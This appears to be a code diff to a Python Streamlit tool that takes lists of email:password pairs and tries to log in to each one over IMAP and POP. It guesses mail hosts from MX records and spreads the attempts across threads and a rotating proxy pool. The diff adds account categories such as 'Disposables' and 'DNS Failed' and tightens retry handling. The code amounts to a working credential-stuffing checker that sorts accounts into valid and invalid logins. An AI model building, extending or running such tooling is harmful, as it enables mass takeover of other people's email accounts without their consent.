@@ -1110,22 +1110,15 @@ def detect_parent_provider(domain):
 
 def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
     candidates = []
-    
-    # 1. Primary & Secondary: Direct standard patterns on the custom domain
     standard_prefixes = ['imap', 'mail', 'pop', 'pop3', 'secure']
     for prefix in standard_prefixes:
         candidates.append(f"{prefix}.{domain}")
     
-    # 2. Add raw custom domain as a fallback
     candidates.append(domain)
     
-    # 3. Tertiary/Quaternary: Extract root domains from MX records if available
     if mx_records:
         for mx in mx_records:
-            # Extract root domain or add mx hostname directly if useful
             candidates.append(mx)
-            
-            # Extract parent domain (e.g., mx01.t-online.de -> t-online.de)
             parts = mx.split('.')
             if len(parts) >= 2:
                 parent_domain = f"{parts[-2]}.{parts[-1]}"
@@ -1133,7 +1126,6 @@ def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
                     for prefix in ['imap', 'mail', 'pop']:
                         candidates.append(f"{prefix}.{parent_domain}")
 
-    # Deduplicate while preserving order
     return list(dict.fromkeys(candidates))
 
 def get_servers(email):
@@ -1152,7 +1144,6 @@ def get_servers(email):
         mx_records = get_mx_hosts(domain)
         candidate_hosts = generate_candidate_hosts(domain, mx_records)
 
-        # Normalize across IMAP, POP, and POP3 queues
         servers = {
             "imap": candidate_hosts,
             "pop": candidate_hosts,
@@ -1417,9 +1408,6 @@ def pop_once(email, password, server, proxy_str=None, insecure=True):
             except Exception: pass
         raise e
 
-def pop3_once(email, password, server, proxy_str=None, insecure=True):
-    return pop_once(email, password, server, proxy_str=proxy_str, insecure=insecure)
-
 def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
     for h in hosts:
         try:
@@ -1459,11 +1447,15 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                 mail.login(target_email.strip(), target_pass.strip())
                 return True, mail, h
             except Exception:
-                if raw_conn:
-                    try: raw_conn.shutdown(socket.SHUT_RDWR)
-                    except Exception: pass
-                    try: raw_conn.close()
-                    except Exception: pass
+                if raw_conn is not None:
+                    try:
+                        raw_conn.shutdown(socket.SHUT_RDWR)
+                    except Exception:
+                        pass
+                    try:
+                        raw_conn.close()
+                    except Exception:
+                        pass
                 continue
         except Exception:
             continue
@@ -1555,6 +1547,8 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     trace_logs.append(f"[direct-sslsoft] -> SOCKET FAILED IMAP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
                     if st_val in ("wrong_password", "need_app_password"):
                         return None, st_val, f"[direct-sslsoft] IMAP {server} -> {st_val}", current_px, trace_logs
+                    elif st_val == "connection_failed":
+                        break
                 except Exception as e:
                     st_val = classify_error(e, domain)
                     is_net = (st_val == "connection_failed")
@@ -1562,6 +1556,8 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     trace_logs.append(f"[direct-sslsoft] -> FAILED IMAP on {server}: {str(e)[:50]} [Classified: {st_val}]")
                     if st_val in ("wrong_password", "need_app_password"):
                         return None, st_val, f"[direct-sslsoft] IMAP {server} -> {st_val}", current_px, trace_logs
+                    elif st_val == "connection_failed":
+                        break
 
             for server in conf.get("pop", [])[:max_attempts]:
                 trace_logs.append(f"[direct-sslsoft] Attempting POP -> Host: {server}:995")
@@ -1575,6 +1571,8 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     trace_logs.append(f"[direct-sslsoft] -> SOCKET FAILED POP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
                     if st_val in ("wrong_password", "need_app_password"):
                         return None, st_val, f"[direct-sslsoft] POP {server} -> {st_val}", current_px, trace_logs
+                    elif st_val == "connection_failed":
+                        break
                 except Exception as e:
                     st_val = classify_error(e, domain)
                     is_net = (st_val == "connection_failed")
@@ -1582,6 +1580,8 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     trace_logs.append(f"[direct-sslsoft] -> FAILED POP on {server}: {str(e)[:50]} [Classified: {st_val}]")
                     if st_val in ("wrong_password", "need_app_password"):
                         return None, st_val, f"[direct-sslsoft] POP {server} -> {st_val}", current_px, trace_logs
+                    elif st_val == "connection_failed":
+                        break
 
     except Exception as e:
         trace_logs.append(f"[direct-sslsoft] Critical Exception in runner: {str(e)}")
@@ -1601,27 +1601,52 @@ col_action1, col_action2 = str_lit.columns([0.65, 0.35])
 with col_action1:
     start_engine_btn = str_lit.button("🔥 Start Live Checking Engine", type="primary")
 with col_action2:
-    engine_action_mode = str_lit.selectbox("Engine Action Mode:", options=["Restart", "Resume Checking"], index=0)
+    engine_action_mode = str_lit.selectbox(
+        "Engine Action Mode:",
+        options=[
+            "Ready to Check",
+            "Disposables",
+            "Typos",
+            "Resume Skipped",
+            "App-Skipped",
+            "Custom Filtered",
+            "DNS Failed"
+        ],
+        index=0,
+        help="Select the account category you would like the live checking engine to execute on."
+    )
 
 active_proxy_pool = get_filtered_active_proxies()
 
 if start_engine_btn:
-    log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode.")
-    if not clean_lines:
-        str_lit.warning("⚠ Please load and filter accounts first.")
+    log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode on category: [{engine_action_mode}].")
+    
+    category_queue_map = {
+        "Ready to Check": clean_lines,
+        "Disposables": disp,
+        "Typos": typo,
+        "Resume Skipped": resume,
+        "App-Skipped": app_skip,
+        "Custom Filtered": custom_skipped,
+        "DNS Failed": dns_skipped
+    }
+    
+    accounts_to_check = category_queue_map.get(engine_action_mode, [])
+    
+    if not accounts_to_check:
+        str_lit.warning(f"⚠ No accounts found in the selected category: '{engine_action_mode}'. Please load or choose another category.")
     else:
         active_proxy_pool = get_filtered_active_proxies()
         
         with session_state_lock:
-            if engine_action_mode == "Restart":
-                str_lit.session_state.valid_results = []
-                str_lit.session_state.wrong_results = []
-                str_lit.session_state.need_app_results = []
-                str_lit.session_state.conn_results = []
-                str_lit.session_state.report_entries = []
-                str_lit.session_state.log_lines = []
-                str_lit.session_state.checked_emails_set = set()
-                str_lit.session_state.last_checked_index = 0
+            str_lit.session_state.valid_results = []
+            str_lit.session_state.wrong_results = []
+            str_lit.session_state.need_app_results = []
+            str_lit.session_state.conn_results = []
+            str_lit.session_state.report_entries = []
+            str_lit.session_state.log_lines = []
+            str_lit.session_state.checked_emails_set = set()
+            str_lit.session_state.last_checked_index = 0
                 
             str_lit.session_state.engine_has_run = True
             str_lit.session_state.run_completion_status = "Unfinished"
@@ -1631,7 +1656,7 @@ if start_engine_btn:
             str_lit.session_state.end_timestamp = None
             str_lit.session_state.total_duration = None
         
-        progress_bar = str_lit.progress(0, text="Initializing checking engine...")
+        progress_bar = str_lit.progress(0, text=f"Initializing checking engine for [{engine_action_mode}]...")
         status_text = str_lit.empty()
         
         exec_tab1, exec_tab2 = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
@@ -1643,25 +1668,9 @@ if start_engine_btn:
             report_metrics_placeholder = str_lit.empty()
             report_log_container = str_lit.empty()
 
-        all_target_accounts = clean_lines[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else clean_lines
-        
-        with session_state_lock:
-            current_checked_set_snapshot = set(str_lit.session_state.checked_emails_set)
+        all_target_accounts = accounts_to_check[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else accounts_to_check
 
-        if engine_action_mode == "Resume Checking" and current_checked_set_snapshot:
-            accounts_to_check = []
-            for acc_line in all_target_accounts:
-                try:
-                    em, _ = acc_line.split(":", 1)
-                    em = em.strip().lower()
-                    if em not in current_checked_set_snapshot:
-                        accounts_to_check.append(acc_line)
-                except Exception:
-                    accounts_to_check.append(acc_line)
-        else:
-            accounts_to_check = all_target_accounts
-
-        total_accs = len(accounts_to_check)
+        total_accs = len(all_target_accounts)
         checked_count = 0
         thread_local = threading.local()
         
@@ -1697,7 +1706,7 @@ if start_engine_btn:
                     current_workers = max(2, min(5, total_accs))
 
             with ThreadPoolExecutor(max_workers=current_workers) as executor:
-                future_to_line = {executor.submit(check_task, line): line for line in accounts_to_check}
+                future_to_line = {executor.submit(check_task, line): line for line in all_target_accounts}
                 
                 for index, future in enumerate(as_completed(future_to_line), 1):
                     checked_count += 1
@@ -1766,7 +1775,7 @@ if start_engine_btn:
                     
                     if total_accs > 0:
                         pct = min(1.0, checked_count / total_accs)
-                        progress_bar.progress(pct, text=f"Checking accounts: {checked_count}/{total_accs} completed ({int(pct*100)}%)")
+                        progress_bar.progress(pct, text=f"Checking accounts [{engine_action_mode}]: {checked_count}/{total_accs} completed ({int(pct*100)}%)")
                     with session_state_lock:
                         v_len = len(str_lit.session_state.valid_results)
                         w_len = len(str_lit.session_state.wrong_results)
